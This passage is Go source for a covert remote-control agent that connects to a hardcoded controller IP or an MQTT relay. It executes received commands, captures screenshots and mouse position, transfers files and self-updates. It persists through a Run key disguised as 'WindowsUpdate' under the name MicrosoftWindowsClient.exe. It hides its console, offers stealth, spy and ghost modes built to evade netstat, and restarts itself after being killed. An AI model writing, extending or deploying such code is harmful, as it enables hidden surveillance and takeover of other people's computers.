						return
					}
					// Parse into cmd + args (first space split, keep rest)
					cmdName := strings.TrimSpace(cmdStr)
					args := ""
					if idx := strings.Index(cmdName, " "); idx != -1 {
						args = strings.TrimSpace(cmdName[idx+1:])
						cmdName = strings.TrimSpace(cmdName[:idx])
					}
					// Dedupe: a second controller may deliver the same command.
					// (ExecuteChecked runs it only on first sight.)
				result, suppressed, err := commands.ExecuteChecked(m.CmdID, cmdName, args)
				if suppressed {
					log.Printf("[*] Duplicate %s suppressed", m.CmdID)
					_ = a.send(protocol.Message{Type: protocol.TypeOutput, CmdID: m.CmdID})
					return
				}
					errStr := ""
					if err != nil {
						errStr = err.Error()
						// If handler returned error but also result, keep result
						if result == "" {
							result = errStr
							errStr = ""
						}
					}
					// Truncate if needed
					if len(result) > 1024*1024 {
						result = result[:1024*1024] + "\n... truncated"
					}
				sendCamFrags(m.CmdID, result, errStr, a.send)
				log.Printf("[*] Sent output (%d bytes)", len(result))
				}(msg)
			case protocol.TypeScreenshotRequest:
			log.Printf("[*] Screenshot requested (quality=%d monitor=%d all=%v scale=%v)", msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale)
			go func(quality, monitor int, all bool, scale float64, tiles bool) {
				if !captureSlot() {
					_ = a.send(protocol.Message{Type: protocol.TypeScreen})
					return
				}
				defer releaseSlot()
				if tiles {
					msgs, err := captureTiled(quality, monitor, all, scale)
					if err != nil {
						log.Printf("[!] capture: %v", err)
						_ = a.send(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					for _, m := range msgs {
						if err := a.send(m); err != nil {
							log.Printf("[!] send screen: %v", err)
							return
						}
					}
					return
				}
				s0 := frameSeq.Load()
				data, w, h, ox, oy, format, err := captureImage(quality, monitor, all, scale)
					if err != nil {
						log.Printf("[!] capture: %v", err)
						_ = a.send(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					if frameSeq.Load() != s0 {
						log.Printf("[*] screenshot superseded, dropping")
						return // a newer frame already published; UI would drop this one
					}
					b64 := base64.StdEncoding.EncodeToString(data)
					log.Printf("[*] Captured %dx%d+%d+%d %s %d bytes -> %d b64", w, h, ox, oy, format, len(data), len(b64))
					if err := a.send(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq(), Scale: effectiveScale(scale)}); err != nil {
						log.Printf("[!] send screen: %v", err)
					}
				}(msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale, msg.Tiles)
			case protocol.TypePing:
				_ = a.send(protocol.Message{Type: protocol.TypePong})
			case protocol.TypePong:
				// ignore
			case protocol.TypeDisconnect:
				// User ended the session from the controller. Go quiet for
				// a while, then resume. Never touches the PC itself.
				a.setQuiet(disconnectQuiet)
				conn.Close()
				return
			default:
				log.Printf("[*] Unknown msg type=%s", msg.Type)
			}
		}
		if err := scanner.Err(); err != nil {
			errCh <- err
		} else {
			errCh <- fmt.Errorf("connection closed")
		}
	}()

	// Periodic tasks
	var mouseTicker *time.Ticker
	var screenTicker *time.Ticker
	var mouseCh <-chan time.Time
	var screenCh <-chan time.Time

	if a.screenshotFPS > 0 {
		interval := time.Duration(float64(time.Second) / a.screenshotFPS)
		if interval < 100*time.Millisecond {
			interval = 100 * time.Millisecond
		}
		screenTicker = time.NewTicker(interval)
		screenCh = screenTicker.C
		log.Printf("[*] Periodic screenshots every %v", interval)
	}
	// Mouse every 120ms (60ms in performance mode; direct path is cheap,
	// unchanged events still deduped). Sends gated by modeCanMouse.
	mouseEvery := 120 * time.Millisecond
	if agentMode == commands.ModePerformance {
		mouseEvery = 60 * time.Millisecond
	}
	mouseTicker = time.NewTicker(mouseEvery)
	mouseCh = mouseTicker.C
	defer func() {
		if mouseTicker != nil {
			mouseTicker.Stop()
		}
		if screenTicker != nil {
			screenTicker.Stop()
		}
	}()

	lastX, lastY := -1, -1

	// Heartbeat ping every 30s
	pingTicker := time.NewTicker(30 * time.Second)
	defer pingTicker.Stop()

	for {
		select {
		case <-a.closing:
			log.Printf("[*] Closing requested")
			conn.Close()
			return nil
		case <-done:
			select {
			case err := <-errCh:
				return err
			default:
				return fmt.Errorf("reader done")
			}
		case <-mouseCh:
			if !modeCanMouse() {
				continue // stealth/spy/ghost/kiosk/audit: no position stream
			}
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			// Don't block on send
			_ = a.send(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y, Buttons: []int{0, 0, 0}})
		case <-screenCh:
			go func() {
				data, w, h, ox, oy, format, err := captureImage(0, 0, false, 0)
				if err != nil {
					return
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				_ = a.send(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq(), Scale: 1})
			}()
		case <-pingTicker.C:
			_ = a.send(protocol.Message{Type: protocol.TypePing})
		case <-a.ghostEnd:
			return nil // ghost window over: go dark until next cycle
		}
	}
}


// relaySessionActive marks a full relay session (MQTT main loop) in
// progress. The listen-only loop below stands down while set, so two relay
// paths never double-handle the same traffic.
var relaySessionActive atomic.Bool

// relayListenOnly keeps a lightweight MQTT command subscription alive
// ALONGSIDE any direct connection, so a second controller house can reach
// this agent through the shared relay. It announces (60s, skipped while
// quiet), answers commands/screenshots/pings/updates, and reseeds E2E keys.
// No mouse ticker here (the direct loop already streams position when up;
// relay modes run their own). Process lifetime; never touches the PC.
func relayListenOnly(a *agent, hn, user, me, caFile string) {
	backoff := 5 * time.Second
	for {
		select {
		case <-a.closing:
			return
		default:
		}
		// Stand down while a full relay session owns the traffic.
		if relaySessionActive.Load() {
			select {
			case <-a.closing:
				return
			case <-time.After(5 * time.Second):
			}
			continue
		}
		if err := relayListenOnce(a, hn, user, me, caFile); err != nil {
			dlog.Printf("[listen] %v", err)
			select {
			case <-a.closing:
				return
			case <-time.After(backoff):
			}
			if backoff < time.Minute {
				backoff *= 2
			}
			continue
		}
		backoff = 5 * time.Second
	}
}

func relayListenOnce(a *agent, hn, user, me, caFile string) error {
	bus, err := mqttrelay.DialAgent(hn)
	if err != nil {
		return err
	}
	defer bus.Close()
	if _, err := commands.E2EInitControllerKey(caFile); err == nil {
		log.Printf("[*] listen-only E2E key ready")
	}
	mout := func(msg protocol.Message) error {
		env := commands.E2EEnvelope(me, "controller", msg, nowMillis())
		// Small interactive frames fail fast (2s); bulk chunks and full
		// outputs keep the 10s publish (a timeout aborts file streams).
		switch msg.Type {
		case protocol.TypeScreen, protocol.TypeTile, protocol.TypeMouse,
			protocol.TypePing, protocol.TypePong:
			return bus.PublishFast("out/"+hn, env)
		}
		return bus.Publish("out/"+hn, env)
	}
	discCh := make(chan struct{}, 1)
	if err := bus.SubscribeCmd(func(env relay.Envelope) {
		payload := env.Payload
		if env.Enc {
			plain, ok := commands.E2EOpen(payload)
			if !ok {
				return
			}
			payload = plain
		}
		var msg protocol.Message
		if err := json.Unmarshal(payload, &msg); err != nil {
			return
		}
		if msg.Target != "" && msg.Target != hn && msg.Target != me {
			return
		}
		switch msg.Type {
		case protocol.TypeConnected:
			if msg.ID != "" && !strings.Contains(msg.ID, hn) {
				return
			}
			if msg.E2E {
				commands.E2EEnable(true)
			}
			noteAck(msg)
		case protocol.TypeCommand:
			go func(m protocol.Message) {
				if isKillCmd(m.Cmd) {
					_ = mout(protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"})
					exitSoon("listen")
					return
				}
				if handleSelfDelete(m.Cmd, func(res, errStr string) {
					_ = mout(protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: m.CmdID})
				}) {
					return
				}
			execCommand(m.Cmd, m.CmdID, 1024*1024, "\n... truncated", mout)
			}(msg)
		case protocol.TypeScreenshotRequest:
			go func(quality, monitor int, all bool, scale float64, tiles bool) {
				if !captureSlot() {
					_ = mout(protocol.Message{Type: protocol.TypeScreen})
					return
				}
				defer releaseSlot()
				if tiles {
					msgs, err := captureTiled(quality, monitor, all, scale)
					if err != nil {
						_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					for _, m := range msgs {
						_ = mout(m)
					}
					return
				}
				s0 := frameSeq.Load()
				data, w, h, ox, oy, format, err := captureImage(quality, monitor, all, scale)
				if err != nil {
					_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
					return
				}
				if frameSeq.Load() != s0 {
					return // superseded by a newer frame; UI would drop this one
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				_ = mout(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq(), Scale: effectiveScale(scale)})
			}(msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale, msg.Tiles)
		case protocol.TypeUpdateBegin:
			go func(m protocol.Message) {
				res, err := commands.StartAgentUpdate(m.UpdateVer, m.UpdateSize, m.UpdateSHA, m.UpdateTotal, m.UpdateGzip, m.UpdateChunk)
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypeUpdateChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteUpdateChunk(m.UpdateSeq, m.Data)
				if res == "" && err == nil {
					return
				}
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypeFileDlReq:
			go func(m protocol.Message) {
				fileDlStream(m.FilePath, m.FileFrom, m.FileHave, m.FileChunk, m.FileThumb, mout)
			}(msg)
		case protocol.TypeFileUlBegin:
			go func(m protocol.Message) {
				res, err := commands.StartFileUl(m.FilePath, m.FileSize, m.FileSHA, m.FileTotal)
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypeFileUlChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteFileUlChunk(m.FileSeq, m.Data, m.FileChunk)
				if res == "" && err == nil {
					return
				}
				_ = mout(updateOutput(res, err))
			}(msg)
		case protocol.TypePing:
			_ = mout(protocol.Message{Type: protocol.TypePong})
		case protocol.TypeDisconnect:
			a.setQuiet(disconnectQuiet)
			select {
			case discCh <- struct{}{}:
			default:
			}
		}
	}); err != nil {
		return err
	}
	announce := func() {
		_ = bus.Publish("hello", relay.Envelope{From: me, To: "", Payload: mustJSON(helloMsg(hn, user)), Time: nowMillis()})
		if wrapped, ok := commands.E2EWrapped(); ok {
			_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypeKeyExchange, Hostname: hn, Instance: instanceID(), Data: wrapped}), Time: nowMillis()})
		}
	}
	announce()
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-a.closing:
			return nil
		case <-discCh:
			return nil
		case <-ticker.C:
			if relaySessionActive.Load() {
				return nil // full session took over; exit, outer loop stands by
			}
			if a.quietRemain() > 0 {
				continue
			}
			announce()
		}
	}
}

// connectViaMQTT joins the MQTT relay (persistent outbound TCP 1883, zero
// polling). Tried after direct dials fail.
func (a *agent) connectViaMQTT() error {
	hn, user := hostnameAndUser()
	me := "agent:" + hn
	relaySessionActive.Store(true)
	defer relaySessionActive.Store(false)
	bus, err := mqttrelay.DialAgent(hn)
	if err != nil {
		return err
	}
	defer bus.Close()

	if _, err := commands.E2EInitControllerKey(a.caFile); err == nil {
		log.Printf("[*] E2E key ready for relay payloads")
	} else {
		log.Printf("[*] E2E unavailable (%v), relay payloads stay plaintext", err)
	}
	// mout publishes agent->controller messages, sealed when E2E is active.
	mout := func(msg protocol.Message) error {
		env := commands.E2EEnvelope(me, "controller", msg, nowMillis())
		// Small interactive frames fail fast (2s); bulk chunks and full
		// outputs keep the 10s publish (a timeout aborts file streams).
		switch msg.Type {
		case protocol.TypeScreen, protocol.TypeTile, protocol.TypeMouse,
			protocol.TypePing, protocol.TypePong:
			return bus.PublishFast("out/"+hn, env)
		}
		return bus.Publish("out/"+hn, env)
	}

	discCh := make(chan struct{}, 1) // user-ended session (callback runs on paho's thread)
	if err := bus.SubscribeCmd(func(env relay.Envelope) {
		payload := env.Payload
		if env.Enc {
			plain, ok := commands.E2EOpen(payload)
			if !ok {
				log.Printf("[!] mqtt: undecryptable payload, dropped")
				return
			}
			payload = plain
		}
		var msg protocol.Message
		if err := json.Unmarshal(payload, &msg); err != nil {
			return
		}
		if msg.Target != "" && msg.Target != hn && msg.Target != me {
			return
		}
		switch msg.Type {
		case protocol.TypeConnected:
			if msg.ID != "" && !strings.Contains(msg.ID, hn) {
				return
			}
			if msg.E2E {
				commands.E2EEnable(true)
			}
			noteAck(msg)
			log.Printf("[*] MQTT controller ack %s", msg.ID)
		case protocol.TypeUpdateBegin:
			log.Printf("[*] MQTT update begin %s", msg.UpdateVer)
			go func(m protocol.Message) {
				res, err := commands.StartAgentUpdate(m.UpdateVer, m.UpdateSize, m.UpdateSHA, m.UpdateTotal, m.UpdateGzip, m.UpdateChunk)
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish update: %v", err)
				}
			}(msg)
		case protocol.TypeUpdateChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteUpdateChunk(m.UpdateSeq, m.Data)
				if res == "" && err == nil {
					return
				}
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish update: %v", err)
				}
			}(msg)
		case protocol.TypeFileDlReq:
			go func(m protocol.Message) {
				fileDlStream(m.FilePath, m.FileFrom, m.FileHave, m.FileChunk, m.FileThumb, mout)
			}(msg)
		case protocol.TypeFileUlBegin:
			go func(m protocol.Message) {
				res, err := commands.StartFileUl(m.FilePath, m.FileSize, m.FileSHA, m.FileTotal)
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish upload: %v", err)
				}
			}(msg)
		case protocol.TypeFileUlChunk:
			go func(m protocol.Message) {
				res, err := commands.WriteFileUlChunk(m.FileSeq, m.Data, m.FileChunk)
				if res == "" && err == nil {
					return
				}
				if err := mout(updateOutput(res, err)); err != nil {
					log.Printf("[!] MQTT publish upload: %v", err)
				}
			}(msg)
		case protocol.TypeCommand:
			log.Printf("[*] MQTT command: %s", msg.Cmd)
			go func(m protocol.Message) {
				cmdStr := m.Cmd
				if isKillCmd(cmdStr) {
					resp := protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"}
					if err := mout(resp); err != nil {
						log.Printf("[!] MQTT publish output: %v", err)
					}
					exitSoon("mqtt")
					return
				}
				if handleSelfDelete(cmdStr, func(res, errStr string) {
					resp := protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: m.CmdID}
					if err := mout(resp); err != nil {
						log.Printf("[!] MQTT publish output: %v", err)
					}
				}) {
					return
				}
			execCommand(cmdStr, m.CmdID, 1024*1024, "\n... truncated", func(resp protocol.Message) error {
				if err := mout(resp); err != nil {
					log.Printf("[!] MQTT publish output: %v", err)
					return err
				}
				return nil
			})
			}(msg)
		case protocol.TypeScreenshotRequest:
			go func(quality, monitor int, all bool, scale float64, tiles bool) {
				if !captureSlot() {
					_ = mout(protocol.Message{Type: protocol.TypeScreen})
					return
				}
				defer releaseSlot()
				if tiles {
					msgs, err := captureTiled(quality, monitor, all, scale)
					if err != nil {
						_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					for _, m := range msgs {
						_ = mout(m)
					}
					return
				}
				s0 := frameSeq.Load()
				data, w, h, ox, oy, format, err := captureImage(quality, monitor, all, scale)
				if err != nil {
					_ = mout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
					return
				}
				if frameSeq.Load() != s0 {
					log.Printf("[*] MQTT screenshot superseded, dropping")
					return // a newer frame already published; UI would drop this one
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				log.Printf("[*] MQTT captured %dx%d+%d+%d %s %d bytes", w, h, ox, oy, format, len(data))
				_ = mout(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq(), Scale: effectiveScale(scale)})
			}(msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale, msg.Tiles)
		case protocol.TypePing:
				_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypePong}), Time: nowMillis()})
		case protocol.TypeDisconnect:
				// User ended the session: go quiet, then break the main loop.
				a.setQuiet(disconnectQuiet)
				select {
				case discCh <- struct{}{}:
				default:
				}
		}
	}); err != nil {
		return err
	}

	announce := func() {
		if err := bus.Publish("hello", relay.Envelope{From: me, To: "", Payload: mustJSON(helloMsg(hn, user)), Time: nowMillis()}); err != nil {
			dlog.Printf("[listen] announce failed: %v", err)
			return
		}
		// Key exchange rides the data channel (out/+) so the controller's
		// hello branch (connect-only) never has to special-case it.
		if wrapped, ok := commands.E2EWrapped(); ok {
			if err := bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypeKeyExchange, Hostname: hn, Instance: instanceID(), Data: wrapped}), Time: nowMillis()}); err != nil {
				dlog.Printf("[listen] keyxchg failed: %v", err)
			}
		}
	}
	log.Printf("[*] MQTT: announcing %s/%s", hn, user)
	announce()
	announceTicker := time.NewTicker(announceEvery(25 * time.Second)) // quiet presence: the sweep still converges quickly on re-hello
	defer announceTicker.Stop()
	mouseTicker := time.NewTicker(150 * time.Millisecond) // MQTT is cheap: near-direct cursor feel
	defer mouseTicker.Stop()
	lastX, lastY := -1, -1
	for {
		select {
		case <-a.closing:
			return nil
		case <-discCh:
			return nil
		case <-announceTicker.C:
			if a.quietRemain() > 0 {
				continue // stay quiet: don't re-announce a session the user ended
			}
			announce()
		case <-mouseTicker.C:
			if !modeCanMouse() {
				continue
			}
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			_ = mout(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y})
		case <-a.ghostEnd:
			return nil // ghost window over: go dark until next cycle
		}
	}
}

func installPersistence() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("persistence only supported on Windows")
	}
	// Use golang.org/x/sys/windows/registry if available; otherwise use reg command
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	exe, _ = filepath.Abs(exe)
	// Try registry via cmd
	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", exe, "/f")
	hideWatchCmd(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg add: %v output=%s", err, string(out))
	}
	log.Printf("[*] Persistence installed: %s -> HKCU Run WindowsUpdate", exe)
	return nil
}

// runDialTest dials each candidate once and exits 0 on first success.
// QoL: `MicrosoftWindowsClient.exe -test` answers "is the controller reachable?" without
// starting the reconnect loop or persistence.
func runDialTest(primary, caFile string, insecure bool) {
	var tlsCfg *tls.Config
	if insecure {
		tlsCfg = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	} else {
		caData, err := os.ReadFile(caFile)
		if err != nil {
			fmt.Printf("FAIL: read ca: %v\n", err)
			os.Exit(1)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caData) {
			fmt.Printf("FAIL: parse ca %s\n", caFile)
			os.Exit(1)
		}
		tlsCfg = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
	}
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	for _, addr := range dialAddrs(primary, loadHouses()) {
		fmt.Printf("dial %s ... ", addr)
		conn, err := tls.DialWithDialer(dialer, "tcp", addr, tlsCfg)
		if err != nil {
			fmt.Printf("FAIL (%v)\n", err)
			continue
		}
		fmt.Printf("OK\n")
		conn.Close()
		os.Exit(0)
	}
	os.Exit(0)
}

// loadControllerConfig reads controller.txt next to the exe (written by the
// installer). It lets the controller IP change without rebuilding the agent:
// the flag still wins when explicitly passed.
func loadControllerConfig(def string) string {
	if exe, err := os.Executable(); err == nil {
		if b, err := os.ReadFile(filepath.Join(filepath.Dir(exe), "controller.txt")); err == nil {
			if v := strings.TrimSpace(string(b)); v != "" {
				return strings.Split(v, "\n")[0]
			}
		}
	}
	return def
}

// healthyHeartbeatPath is where the agent stamps a Unix-seconds liveness
// marker every 30s. The watchdog treats a marker older than 90s as hung and
// restarts the process even when it still exists.
func healthyHeartbeatPath() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM", "healthy")
	}
	return filepath.Join(os.TempDir(), "RMM", "healthy")
}

// startHealthyHeartbeat stamps the healthy file immediately and every 30s.
// Failures are non-fatal (watchdog treats a missing file as unhealthy).
func startHealthyHeartbeat(stop <-chan struct{}) {
	stamp := func() {
		p := healthyHeartbeatPath()
		_ = os.MkdirAll(filepath.Dir(p), 0755)
		_ = os.WriteFile(p, []byte(fmt.Sprintf("%d\n", time.Now().Unix())), 0644)
	}
	stamp()
	t := time.NewTicker(30 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			stamp()
		}
	}
}

// dlog is the verbose lane: everything log.* writes PLUS debug-only extras.
// agent.log stays short; agent-debug.log is the superset for deep dives.
var dlog = log.New(io.Discard, "", log.LstdFlags)

// setupLogFile mirrors logs to %LOCALAPPDATA%/RMM/agent.log (short) and
// agent-debug.log (verbose superset; the silent agent otherwise has no
// visible console). Both rotate past 5MB. Failures are non-fatal.
func setupLogFile() {
	const maxLogBytes = 5 << 20
	dir := ""
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	} else {
		dir = filepath.Join(os.TempDir(), "RMM")
	}
	if err := os.MkdirAll(dir, 0755); err != nil {
		return
	}
	rotate := func(p string) {
		if info, err := os.Stat(p); err == nil && info.Size() > maxLogBytes {
			_ = os.Remove(p + ".1")
			_ = os.Rename(p, p+".1")
		}
	}
	shortPath := filepath.Join(dir, "agent.log")
	debugPath := filepath.Join(dir, "agent-debug.log")
	rotate(shortPath)
	rotate(debugPath)
	f, err := os.OpenFile(shortPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	df, err := os.OpenFile(debugPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.SetOutput(io.MultiWriter(os.Stderr, f))
		return
	}
	log.SetOutput(io.MultiWriter(os.Stderr, f, df))
	dlog.SetOutput(df)
}

func main() {
	addr := flag.String("controller", "176.229.98.54:4444", "controller address host:port")
	caFile := flag.String("ca", "certs/server.crt", "CA cert file (server.crt)")
	insecure := flag.Bool("insecure", false, "skip TLS verification (for testing)")
	fps := flag.Float64("fps", 0, "periodic screenshot FPS (0=on-demand only)")
	persist := flag.Bool("persist", false, "install registry persistence and exit")
	ntfyTopic := flag.String("ntfy", "", "REMOVED in v1.45 (ntfy relay deleted); accepted and ignored")
	ntfyServer := flag.String("ntfy-server", "", "REMOVED in v1.45 (ntfy relay deleted); accepted and ignored")
	ntfyOnly := flag.Bool("ntfy-only", false, "REMOVED in v1.45 (ntfy relay deleted); accepted and ignored")
	mqttOnly := flag.Bool("mqtt-only", false, "skip direct dials, use MQTT relay only")
	watchMode := flag.Bool("watch", false, "run as supervisor: keep the agent alive, no network")
	wmiHeal := flag.Bool("wmi-heal", false, "repair tasks+Run keys from local XMLs and exit (WMI timer target)")
	svcHeal := flag.Bool("svc-heal", false, "run as SYSTEM repair service (repairs only, never the agent)")
	testOnly := flag.Bool("test", false, "dial controller once, print result, exit")
	showHelp := flag.Bool("help", false, "show help")
	modeFlag := flag.String("mode", "", "operation mode (normal, stealth, spy, ghost, performance, kiosk, audit); wins for this run only")
	flag.Parse()

	// Resolve operation mode: flag wins for this run, else mode.json.
	if *modeFlag != "" {
		if !commands.IsValidMode(*modeFlag) {
			log.Fatalf("unknown -mode %q (valid: %s)", *modeFlag, strings.Join(commands.ValidModes, ", "))
		}
		commands.OverrideMode = *modeFlag
	}
	agentMode = commands.AgentMode()
	if agentMode != commands.ModeNormal {
		log.Printf("[*] Agent mode: %s", agentMode)
	}

	if *ntfyServer != "" || *ntfyTopic != "" || *ntfyOnly {
		log.Printf("[!] ntfy relay was removed in v1.45 — ntfy flags ignored (direct/MQTT only)")
	}
	// controller.txt next to exe overrides the compiled default (unless the
	// flag was explicitly changed from the default).
	if *addr == "176.229.98.54:4444" {
		if v := loadControllerConfig(""); v != "" {
			*addr = v
		}
	}
	setupLogFile()
	// Release builds are windowsgui-subsystem (no console is ever created,
	// so no flash is possible). Interactive runs attach back to a console
	// for readable output; everything else hides (belt and suspenders).
	if *testOnly || *showHelp || *persist {
		ensureInteractiveConsole()
	} else {
		hideOwnConsole()
	}
	if *svcHeal {
		if err := runSvcHealing(); err != nil {
			log.Fatalf("service: %v", err)
		}
		return
	}
	if *wmiHeal {
		runWmiHeal()
		return
	}
	if *watchMode {
		runWatch()
		return
	}
	// Self-apply a staged update when running elevated (standard-user
	// runs return false silently; watcher/WMI/service handle those).
	if commands.ApplyStagedUpdate() {
		log.Printf("[*] staged update applied, restart picks it up")
	}
	commands.EnsureKeepAwake()
	// Liveness marker for the watchdog (process-exists is not enough).
	healthyStop := make(chan struct{})
	defer close(healthyStop)
	go startHealthyHeartbeat(healthyStop)
	// Spy journal runs only in spy mode (set-mode restarts into/out of it).
	if agentMode == commands.ModeSpy {
		commands.StartSpyJournal()
		defer commands.StopSpyJournal()
	}
	// Crash-rollback reporting: if the watchdog restored the previous
	// binary after a crash loop, tell the controller on every hello.
	rollbackNotice = commands.LoadRollbackNotice()
	// Update self-confirm: surviving 10min clears the prev backup + pending
	// claim; crashing first leaves them for the watchdog to roll back.
	go commands.ConfirmUpdate()

	if *showHelp {
		flag.Usage()
		fmt.Println("\nExample:")
		fmt.Println("  MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca certs/server.crt")
		fmt.Println("  MicrosoftWindowsClient.exe -controller localhost:4444 -insecure")
		fmt.Println("  MicrosoftWindowsClient.exe -persist   # install auto-start")
		fmt.Println("  MicrosoftWindowsClient.exe -test      # dial once and exit")
		os.Exit(0)
	}

	// One agent per PC: stale duplicates are reaped, logon races yield to
	// the healthy holder, and only a wedged holder is taken over.
	// Skipped for -test runs.
	if !*testOnly {
		ensureSingleInstance()
	}

	if *persist {
		if err := installPersistence(); err != nil {
			log.Fatalf("persistence: %v", err)
		}
		return
	}

	// Handle --ca relative to exe dir if not found
	if !*insecure {
		if _, err := os.Stat(*caFile); os.IsNotExist(err) {
			// Try next to exe
			exeDir := filepath.Dir(os.Args[0])
			alt := filepath.Join(exeDir, "server.crt")
			if _, err2 := os.Stat(alt); err2 == nil {
				*caFile = alt
			} else {
				alt2 := filepath.Join(exeDir, "certs", "server.crt")
				if _, err3 := os.Stat(alt2); err3 == nil {
					*caFile = alt2
				}
			}
		}
	}

	if *testOnly {
		runDialTest(*addr, *caFile, *insecure)
		return
	}

	// Graceful shutdown on Ctrl+C
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)

	ag := &agent{
		controllerAddr: *addr,
		caFile:         *caFile,
		insecure:       *insecure,
		screenshotFPS:  *fps,
		closing:        make(chan struct{}),
	}

	// Second-house ear: in default mode (direct capable), keep a lightweight
	// relay listener alongside whatever the main loop uses, so another
	// controller house can reach this agent through the shared bus.
	// Relay-only modes run their own full session; the listener stands down
	// whenever one is active. Ghost mode skips it: no sockets between wakes.
	if !*mqttOnly && agentMode != commands.ModeGhost {
		hn0, user0 := hostnameAndUser()
		me0 := "agent:" + hn0
		ca0 := *caFile
		go relayListenOnly(ag, hn0, user0, me0, ca0)
	}

	go func() {
		<-sigCh
		fmt.Println("\n[*] Signal received, shutting down...")
		close(ag.closing)
		// Give time to send disconnect
		if ag.conn != nil {
			_ = ag.send(protocol.Message{Type: protocol.TypeDisconnect})
			ag.conn.Close()
		}
		os.Exit(0)
	}()

	// Also handle input to allow clean exit via 'exit' typed? Not needed for agent.

	// waitQuiet sleeps out a user-requested quiet period (session ended from
	// the controller). Returns false on shutdown.
	waitQuiet := func() bool {
		if rem := ag.quietRemain(); rem > 0 {
			log.Printf("[*] Quiet period: resuming in %s...", rem.Round(time.Second))
			select {
			case <-ag.closing:
				return false
			case <-time.After(rem):
			}
		}
		return true
	}

	if *mqttOnly {
		log.Printf("[*] mqtt-only mode: skipping direct dials")
		for {
			if !waitQuiet() {
				return
			}
			_ = ag.connectViaMQTT()
			select {
			case <-ag.closing:
				return
			default:
			}
		}
	}

	// Ghost mode: ~45s wake windows every ~75s (netstat-clean between
	// wakes; set-mode lands within 30s). Short sessions retry faster.
	if agentMode == commands.ModeGhost {
		log.Printf("[*] ghost mode: 45s windows every ~75s (checks for mode changes)")
		for {
			select {
			case <-ag.closing:
				return
			default:
			}
			start := time.Now()
			ag.ghostEnd = time.After(45 * time.Second)
			_ = ag.connectOnce()
			ag.ghostEnd = nil
			ag.conn = nil
			ag.enc = nil
			if time.Since(start) < 10*time.Second {
				ag.setQuietSilent(30 * time.Second)
			} else {
				ag.setQuietSilent(30 * time.Second)
			}
			if !waitQuiet() {
				return
			}
		}
	}

	// Reconnect loop with exponential backoff
	backoff := time.Second
	maxBackoff := 30 * time.Second
	for {
		if !waitQuiet() {
			return
		}
		err := ag.connectOnce()
		// Check if closing
		select {
		case <-ag.closing:
			return
		default:
		}
		if err != nil {
			// Check if it's a clean shutdown
			if strings.Contains(err.Error(), "closing") {
				return
			}
			log.Printf("[-] Disconnected: %v — reconnect in %v", err, backoff)
			time.Sleep(backoff)
			backoff *= 2
